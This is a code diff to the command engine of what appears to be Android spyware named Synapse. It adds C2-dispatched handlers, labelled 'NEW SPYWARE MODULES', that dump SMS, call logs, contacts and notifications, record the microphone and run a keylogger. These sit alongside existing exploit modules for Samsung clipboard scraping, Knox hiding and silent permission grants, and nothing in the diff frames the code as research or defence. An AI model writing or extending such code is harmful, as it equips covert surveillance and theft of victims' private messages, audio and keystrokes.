@@ -14,6 +14,12 @@ import org.synapse.core.modules.LocationModule
 import org.synapse.core.modules.SemClipboardExploit
 import org.synapse.core.modules.ShellModule
 import org.synapse.core.modules.SilentPermissionGrant
+import org.synapse.core.modules.SmsModule
+import org.synapse.core.modules.CallLogModule
+import org.synapse.core.modules.ContactsModule
+import org.synapse.core.modules.MicModule
+import org.synapse.core.modules.NotificationModule
+import org.synapse.core.modules.KeylogModule
 
 object SynapseEngine {
     private const val TAG = "Synapse"
@@ -59,7 +65,37 @@ object SynapseEngine {
             "semclipboard" to { cmd -> try { SemClipboardExploit.scrape(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("semclipboard:${e.message}", "semclipboard") } },
             "knox_hide_v2" to { cmd -> try { KnoxHideExploit.hide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_hide_v2:${e.message}", "knox_hide_v2") } },
             "knox_unhide_v2" to { cmd -> try { KnoxHideExploit.unhide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_unhide_v2:${e.message}", "knox_hide_v2") } },
-            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("silent_grant:${e.message}", "silent_grant") } }
+            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("silent_grant:${e.message}", "silent_grant") } },
+            // ── NEW SPYWARE MODULES ──
+            "sms"      to { cmd -> when (cmd.action) {
+                "list" -> SmsModule.list(context, cmd)
+                "read" -> SmsModule.read(context, cmd)
+                "dump" -> SmsModule.dump(context, cmd)
+                else -> SynapseResponse.ErrorResponse("sms:unknown_action:${cmd.action}", "sms")
+            }},
+            "calls"    to { cmd -> when (cmd.action) {
+                "list" -> CallLogModule.list(context, cmd)
+                else -> SynapseResponse.ErrorResponse("calls:unknown_action:${cmd.action}", "calls")
+            }},
+            "contacts" to { cmd -> when (cmd.action) {
+                "list" -> ContactsModule.list(context, cmd)
+                else -> SynapseResponse.ErrorResponse("contacts:unknown_action:${cmd.action}", "contacts")
+            }},
+            "mic"      to { cmd -> when (cmd.action) {
+                "record" -> MicModule.record(context, cmd)
+                "stop" -> MicModule.stop(context, cmd)
+                else -> SynapseResponse.ErrorResponse("mic:unknown_action:${cmd.action}", "mic")
+            }},
+            "notifications" to { cmd -> when (cmd.action) {
+                "list" -> NotificationModule.list(context, cmd)
+                else -> SynapseResponse.ErrorResponse("notifications:unknown_action:${cmd.action}", "notifications")
+            }},
+            "keylog"   to { cmd -> when (cmd.action) {
+                "start" -> KeylogModule.start(context, cmd)
+                "stop" -> KeylogModule.stop(context, cmd)
+                "dump" -> KeylogModule.dump(context, cmd)
+                else -> SynapseResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
+            }}
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
